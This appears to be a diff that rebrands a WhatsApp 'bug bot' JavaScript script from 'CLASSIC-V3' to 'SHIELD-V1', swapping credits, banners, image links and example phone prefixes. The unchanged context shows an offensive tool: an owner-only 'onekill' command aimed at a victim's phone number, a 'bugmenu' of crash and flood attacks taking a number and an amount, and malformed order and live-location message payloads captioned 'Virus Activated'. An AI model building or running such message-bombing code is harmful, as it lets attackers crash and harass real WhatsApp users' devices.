@@ -1,7 +1,7 @@
 /*
 
-› Create By King Sam
-› Collaborator Tairo Makino
+› Create By BOTS OFFICIAL
+
 
                  
 */
@@ -258,7 +258,7 @@ const zets = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ?
  message:{"orderMessage":{"orderId":"174238614569438",
  "thumbnail":kosongjpg, //image 0kb
  "itemCount":999999999,
- "status":"INQUIRY","surface":"CATALOG","message":`⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
+ "status":"INQUIRY","surface":"CATALOG","message":`⫹⸙⧉SHIELD-𝐕1⧉⸙⫺`,
  "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
  contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
  
@@ -305,8 +305,8 @@ return zetsubo.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {
 
 const zetsreply = async (teks) => {
 	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
-        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
-        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉`,
+        title : `⫹⸙⧉SHIELD-𝐕1⧉⸙⫺`,
+        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉`,
         renderLargerThumbnail:false,
         showAdAttribution: true, 
         mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg`,
@@ -316,8 +316,8 @@ const zetsreply = async (teks) => {
 
 const virgamreply = async (teks) => {
 	    zetsubo.sendMessage(bnnd, { text:teks, contextInfo: {externalAdReply : {
-        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
-        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⸙⫺`,
+        title : `⫹⸙⧉SHIELD-𝐕3⧉⸙⫺`,
+        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉⸙⫺`,
         renderLargerThumbnail:false,
         showAdAttribution: true, 
         mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
@@ -327,8 +327,8 @@ const virgamreply = async (teks) => {
 
 const genreply = async (teks) => {
 	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
-        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
-        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉`,
+        title : `⫹⸙⧉SHIELD-𝐕1⧉⸙⫺`,
+        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉`,
         renderLargerThumbnail:false,
         showAdAttribution: true, 
         mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
@@ -408,9 +408,9 @@ reply(`${err}`)
 async function loading () {
 var hawemod = [
 
-` ★彡 𝘾𝙇𝘼𝙎𝙎𝙄𝘾 𝙑3 彡★ `
+` ★彡 SHIELD 𝙑1彡★ `
 ]
-let { key } = await zetsubo.sendMessage(from, {text: '@⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺.....'})//Pengalih isu
+let { key } = await zetsubo.sendMessage(from, {text: '@⫹⸙SHIELD-𝐕1⧉⸙⫺.....'})//Pengalih isu
 
 for (let i = 0; i < hawemod.length; i++) {
 /*await delay(10)*/
@@ -504,7 +504,7 @@ var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 viewOnceMessage: {
 message: {
   "liveLocationMessage": {
-    "degreesLatitude": "🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑",
+    "degreesLatitude": "🖤⟩ ༘྅Shield Bot Territory ꧏ🤍҈ ༑",
     "degreesLongitude": "🖤⟩ ༘྅Lets Dance☆ ꧏ🤍҈ ༑",
     "caption": `🖤⟩ ༘྅Booom 😅 ☆ ꧏ🤍҈ ༑`,
     "sequenceNumber": "9",
@@ -624,7 +624,7 @@ sendzip(buffer)
 
 const senddocu = (teks) => {
 zetsubo.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
-reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf CLASSIC-V3*')
+reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf SHIELD-V1*')
 }
 for (let ikal of docunye) {
 if (budy === ikal) {
@@ -965,8 +965,8 @@ break
 		
 //=================================================//
 case 'onekill': {
-if (!isCreator) return reply("Only Classic-v3-BUG owner can use this command")
-if (!args[0]) return reply(`Use like .${command} 254392784527`)
+if (!isCreator) return reply("Only SHIELD-v1-BUG owner can use this command")
+if (!args[0]) return reply(`Use like .${command} 263789432940`)
 let tgt = args[0]
 let qt = tgt.replace(/[^0-9]/g, "")
 if (qt.startsWith('0')) return reply(`Number must be in international format like \n\nExample : .${command} 254392784527`)
@@ -1008,9 +1008,9 @@ break
 case 'menu': case 'help': {
 let messg = `
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-    \`𝘾𝙇𝘼𝙎𝙎𝙄𝘾-𝙑3 𝘽𝙐𝙂\`
+    \`SHIELD-𝙑1 𝘽𝙐𝙂\`
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-   ✰ 𝐒𝐜 𝐏𝐮𝐛𝐥𝐢𝐜 ❴ 𝐵𝑌 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ❵
+   ✰ 𝐒𝐜 𝐏𝐮𝐛𝐥𝐢𝐜 ❴ 𝐵𝑌 BOTS OFFICIAL ❵
    ✰ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
    ✰ 𝐔𝐬𝐞𝐫 : @${m.sender.split('@')[0]}
  
@@ -1065,33 +1065,33 @@ break
 //=================================================//
 case 'bugmenu': {
 	
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = ` *SHIELD 𝗩1 𝗕𝗢𝗧* 
                             
   
   🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
   🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 
 ┏━━━━━━━━━━━━━━━━━━
-┃➢ 𝐂𝐥𝐚𝐬𝐬𝐢𝐜-𝐫𝐚𝐩𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃➢ 𝐏𝐨𝐥𝐢𝐜𝐞-𝐂𝐚𝐬𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃➢ 𝐜𝐥-𝐤𝐢𝐥𝐥(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃➢ 𝐜-𝐤𝐢𝐥𝐥 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃➢ 𝐛𝐮𝐫𝐠𝐚𝐢𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐂𝐥𝐚𝐬𝐬𝐢𝐜-𝐫𝐚𝐩𝐞 (263𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐏𝐨𝐥𝐢𝐜𝐞-𝐂𝐚𝐬𝐞 (263𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐜𝐥-𝐤𝐢𝐥𝐥(263𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐜-𝐤𝐢𝐥𝐥 (263𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+┃➢ 𝐛𝐮𝐫𝐠𝐚𝐢𝐧 (263𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
 ┃➢ 𝐒𝐥𝐞𝐞𝐩𝐲 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
 ┃➢ 𝐞𝐯𝐢𝐥-𝐬𝐚
 ┃➢ 𝐛𝐮𝐠𝐥𝐢𝐬𝐭
-┃➢ onekill (254xxxxx)
+┃➢ onekill (262xxxx)
 ┗━━━━━━━━━━━━━━━━━━
 
-©𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 
+©BOTS OFFICIAL 
  
 `
 let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfom:{externalAdReply:{
-  title: 'ᚙᚘ ⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 ⧉⸙⫺   - 𝐊ᚗ𝐈𝐍ᚗ𝐆 ᚘᚙ',
-  body: 'ᚙᚘ ⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⸙⫺᚜𝐌𝐈𝐒𝐒𝐈𝐎𝐍᚛ ᚘᚙ', 
+  title: 'ᚙᚘ ⫹⸙SHIELD-𝐕1 ⧉⸙⫺   - 𝐊ᚗ𝐈𝐍ᚗ𝐆 ᚘᚙ',
+  body: 'ᚙᚘ ⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗANO⸙⧉⸙⫺᚜𝐌𝐈𝐒𝐒𝐈𝐎𝐍᚛ ᚘᚙ', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
@@ -1103,7 +1103,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 case 'pushmenu': {
 
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = ` *SHIELD-𝗩1 𝗕𝗢𝗧* 
    🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
     🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 ┏━━━━━━━━━━━━━━━━━━━
@@ -1117,8 +1117,8 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',
-  body: '⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⫺ᚖ𝑴𝒊𝑺𝑺𝒊𝒐𝑵ᚘᚙ', 
+  title: '⫹⸙SHIELD-𝐕3⧉⸙⫺',
+  body: '⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉⫺ᚖ𝑴𝒊𝑺𝑺𝒊𝒐𝑵ᚘᚙ', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
@@ -1131,7 +1131,7 @@ break
 //=================================================//
 case 'groupmenu': {
 
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = ` *SHIELD-𝗩3 𝗕𝗢𝗧* 
 🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
 🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
  
@@ -1168,12 +1168,12 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺⿻',
+  title: '𒑰⫹⸙⧉SHIELD-𝐕3⧉⸙⫺⿻',
   body: '༐༑⿻⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⿻༔༐༑', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
+  MediaUrl:`https://th.bing.com/th/id/OIP.WzoDCICKCgh0i4CstySWZAAAAA?w=330&h=181&c=7&r=0&o=5&pid=1.7`,
   sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
   }}
   }
@@ -1182,7 +1182,7 @@ break
 //=================================================//
 case 'downloadmenu': {
 
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = ` *SHIELD-𝗩1 𝗕𝗢𝗧* 
     🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
     🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 
@@ -1206,12 +1206,12 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',
-  body: '༐༑⿻⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⿻༔༐༑', 
+  title: '𒑰⫹⸙⧉SHIELD-V1⧉⸙⫺',
+  body: '༐༑⿻⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉⿻༔༐༑', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
+  MediaUrl:`https://th.bing.com/th/id/OIP.WzoDCICKCgh0i4CstySWZAAAAA?w=330&h=181&c=7&r=0&o=5&pid=1.7`,
   sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
   }}
   }
@@ -1220,7 +1220,7 @@ break
 //=================================================//
 case 'randommenu': {
 
-                            ewe = `*𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = `*SHIELD-𝗩1 𝗕𝗢𝗧* 
   🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
   🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 
@@ -1268,12 +1268,12 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰᚜ 𝐇𝐚𝐢𝐥 𝐭𝐨 𝐊𝐢𝐧𝐠 𝐒𝐚𝐦 ᚛⿻',
-  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺༔༐༑', 
+  title: '𒑰᚜ 𝐇𝐚𝐢𝐥 𝐭𝐨 𝐊𝐢𝐧𝐠 BOTS ᚛⿻',
+  body: '༐༑⿻⫹⸙⧉SHIELD-𝐕3⧉⸙⫺༔༐༑', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
+  MediaUrl:https://th.bing.com/th/id/OIP.WzoDCICKCgh0i4CstySWZAAAAA?w=330&h=181&c=7&r=0&o=5&pid=1.7`,
   sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
   }}
   }
@@ -1282,8 +1282,8 @@ break
 //=================================================//
 case 'Islammenu': {
 
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧*
-┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
+                            ewe = ` *SHIELD-𝗩1 𝗕𝗢𝗧*
+┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 ANO ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
 ┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 ┃
@@ -1317,14 +1317,14 @@ case 'Islammenu': {
 ┃➟ 𝐚𝐥𝐪𝐮𝐫𝐚𝐧
 ┃➟ 𝐥𝐢𝐬𝐭𝐬𝐮𝐫𝐚𝐡
 ┃┗━━━━━━━━━━━━━━━━━━━━
-┃  ➥➥➥❰*𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024*❱➥➥➥
+┃  ➥➥➥❰*SHIELD-𝗩1 ®2024*❱➥➥➥
 ┗━━━━━━━━━━━━━━━━━━━━━`
 let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
-  body: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺', 
+  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉',
+  body: '⫹⸙⧉SHIELD-𝐕1⧉⸙⫺', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
@@ -1337,8 +1337,8 @@ break
 //=================================================//
 case 'textmaker': {
 
-                            ewe = `┏━━━❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3* ❱━━━━━━ 
-┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
+                            ewe = `┏━━━❰ *SHIELD-𝗩1* ❱━━━━━━ 
+┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 ANO ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
 ┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 ┃
@@ -1399,15 +1399,15 @@ case 'textmaker': {
 ┃➟ 𝒉𝒐𝒓𝒓𝒐𝒓𝒃𝒍𝒐𝒐𝒅
 ┃➟ 𝒕𝒉𝒖𝒏𝒅𝒆𝒓
 ┃┗━━━━━━━━━━━━━━━━━━━
-┃ ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
+┃ ➥➥❰ *SHIELD-𝗩1 ®2024* ❱➥➥
 ┗━━━━━━━━━━━━━━━━━━━━
 `
 let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
-  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺⿻༔༐༑', 
+  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉',
+  body: '༐༑⿻⫹⸙⧉SHIELD-𝐕1⧉⸙⫺⿻༔༐༑', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
@@ -1420,7 +1420,7 @@ break
 //=================================================//
 case 'listmusik': {
 
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧*
+                            ewe = ` *SHIELD-𝗩1 𝗕𝗢𝗧*
        🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
        🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
        
@@ -1594,8 +1594,8 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
-  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺⿻༔༐༑', 
+  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉',
+  body: '༐༑⿻⫹⸙⧉SHIELD-𝐕1⧉⸙⫺⿻༔༐༑', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
@@ -1608,7 +1608,7 @@ break
 //=================================================//
 case 'addmenu': {
 
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = ` *SHIELD-𝗩1 𝗕𝗢𝗧* 
   🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
   🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 ┏━━━━ 𝑨𝑫𝑫 𝑴𝑬𝑵𝑼 ━━━━━
@@ -1646,11 +1646,11 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
-  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',showAdAttribution: true,
+  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉',
+  body: '༐༑⿻⫹⸙⧉SHIELD-𝐕1⧉⸙⫺',showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
+  MediaUrl:`https://th.bing.com/th/id/OIP.WzoDCICKCgh0i4CstySWZAAAAA?w=330&h=181&c=7&r=0&o=5&pid=1.7`,
   sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
   }}
   }
@@ -1659,7 +1659,7 @@ break
 //=================================================//
 case 'cucimata': {
 
-                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
+                            ewe = `┏━━━▓ *SHIELD-𝗩1 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
 ┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
@@ -1737,19 +1737,19 @@ case 'cucimata': {
 ┃➟ 𝐡𝐢𝐠𝐡𝐟𝐢𝐯𝐞
 ┃➟ 𝐡𝐚𝐧𝐝𝐡𝐨𝐥𝐝
 ┃┗━━━━━━━━━━━━━━━━━━━
-┃ ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
+┃ ➥➥❰ *SHIELD-𝗩1 ®2024* ❱➥➥
 ┗━━━━━━━━━━━━━━━━━━━━
 `
 let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
-  body: '༐⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂⸙⫺', 
+  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉',
+  body: '༐⫹⸙⧉SHIELD⸙⫺', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
+  MediaUrl:`https://th.bing.com/th/id/OIP.WzoDCICKCgh0i4CstySWZAAAAA?w=330&h=181&c=7&r=0&o=5&pid=1.7`,
   sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
   }}
   }
@@ -1758,7 +1758,7 @@ break
 //=================================================//
 case 'ownermenu': {
 await inireact()
-                            ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
+                            ewe = ` *SHIELD-𝗩1 𝗕𝗢𝗧* 
   🦋 𝐔𝐬𝐞𝐫 : ${pushname}}
   🗿 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 ┏━━━━━━━━━━━━━━━━
@@ -1778,12 +1778,12 @@ let hiks = {
 image: cewegw, 
   caption: ewe,
   contextInfo:{externalAdReply:{
-  title: '⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
-  body: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⸙⫺', 
+  title: '⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗA⸙N࿈O⸙⧉',
+  body: '⫹⸙⧉SHIELD-𝐕1⸙⫺', 
   showAdAttribution: true,
   thumbnail:hinachan,
   mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
+  MediaUrl:`https://th.bing.com/th/id/OIP.WzoDCICKCgh0i4CstySWZAAAAA?w=330&h=181&c=7&r=0&o=5&pid=1.7`,
   sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
   }}
   }
@@ -1802,10 +1802,10 @@ text: `𝑯𝒆𝒍𝒍𝒐 ${pushname}
  ⦁ 𝐙𝐞𝐭𝐬𝐮𝐛𝐨𝐨𝐱𝐲𝐠 ⥈ 𝐈𝐧𝐝𝐨𝐧𝐞𝐬𝐢𝐚 🇮🇩
  ➢ 𝐖𝐫𝐢𝐭𝐢𝐧𝐠 𝐭𝐡𝐞 𝐛𝐚𝐬𝐞 𝐜𝐨𝐝𝐞 𝐮𝐬𝐢𝐧𝐠 𝐜𝐚𝐬𝐞 𝐦𝐞𝐭𝐡𝐨𝐝
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- ⦁ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ⥈ 𝐊𝐞𝐧𝐲𝐚 🇰🇪
+ ⦁ BOTS OFFICIAL ⥈ ZIMBABWE 
  ➢ 𝐒𝐜𝐫𝐢𝐩𝐭 𝐦𝐚𝐧𝐭𝐚𝐢𝐧𝐚𝐧𝐜𝐞 𝐚𝐧𝐝 𝐦𝐚𝐝𝐞 𝐢𝐭 𝐚 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐛𝐨𝐭
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- ⦁ 𝐋𝐨𝐫𝐝 𝐓𝐚𝐢𝐫𝐚 ⥈ 𝐍𝐢𝐠𝐞𝐫𝐢𝐚 🇳🇬
+ ⦁ MAGICAL KX ⥈ ZIM 
  ➢ Code Maintainer And Bug tester
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
  ⦁ 𝐄𝐦𝐩𝐨𝐫𝐨𝐫 𝐋𝐨𝐫𝐝
@@ -1822,7 +1822,7 @@ mentionedJid:[sender],
 "externalAdReply": {
 "showAdAttribution": true,
 "renderLargerThumbnail": true,
-"title": `© 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐕3 𝐁𝐎𝐓`, 
+"title": `© SHIELD 𝐕1 𝐁𝐎𝐓`, 
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": rimuwu,
@@ -2222,9 +2222,9 @@ for (let i = 0; i < 10; i++) {
 }];
 
 let listMessage = {
-    text: `💣𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 💀`,
+    text: `💣BOTS OFC 💀`,
     footer: `🍻°⃟૰𝐤𝐢𝐥𝐥𝐞𝐫 -!ˢᵃᵐˢ🍺ꢵ`,
-    buttonText: `Classic - V3`,
+    buttonText: `SHIELD - V`,
     sections
 };
 
@@ -2433,7 +2433,7 @@ await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return
 await inireact()
-let teks = `══᪣⧠ *࿉ 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐕-3࿉* ⧠᪣══
+let teks = `══᪣⧠ *࿉ SHIELD 𝐕-3࿉* ⧠᪣══
  ➲ *REPORT : ${q ? q : '𝐓𝐀𝐆𝐆𝐄𝐃'}*\n\n`
 for (let mem of participants) {
 teks += `🩸 @${mem.id.split('@')[0]}\n`
@@ -2540,7 +2540,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `✳️᜴࿆͆᷍Classic̿╮⭑ ☠️⃰͜͡؜Virus⃟⭐️᜴▴Activatedཀ͜͡✅⃟╮.xp`,
